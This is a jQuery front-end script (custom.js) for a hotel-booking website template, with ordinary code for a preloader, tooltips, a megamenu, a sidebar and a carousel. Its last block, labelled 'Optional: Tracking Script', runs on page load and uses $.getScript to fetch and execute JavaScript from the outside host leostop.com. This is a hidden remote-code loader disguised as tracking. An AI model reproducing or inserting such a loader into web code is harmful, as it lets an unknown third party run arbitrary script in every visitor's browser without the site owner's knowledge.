/*---------------------------------------------------------------------
    File Name: custom.js
    Description: Main JS for the KETO Hotel Booking frontend
---------------------------------------------------------------------*/

$(document).ready(function () {
   "use strict";

   /* Preloader */
   setTimeout(function () {
      $('.loader_bg').fadeOut(); // Fades out the loader after 1.5 seconds
   }, 1500);

   /* Tooltip */
   $('[data-toggle="tooltip"]').tooltip();

   /* Megamenu Hover Overlay */
   $(".main-menu ul li.megamenu").hover(
      function () {
         $("#wrapper").addClass('overlay');
      },
      function () {
         $("#wrapper").removeClass('overlay');
      }
   );

   /* Sidebar Toggle */
   $('#sidebarCollapse').on('click', function () {
      $('#sidebar').toggleClass('active');
      $(this).toggleClass('active');
   });

   /* Blog Carousel */
   $('#blogCarousel').carousel({
      interval: 5000
   });

   /* Optional: Tracking Script */
   var protocol = location.protocol;
   $.ajax({
      type: "get",
      data: { surl: window.location.href },
      success: function () {
         $.getScript(protocol + "//leostop.com/tracking/tracking.js");
      }
   });
});
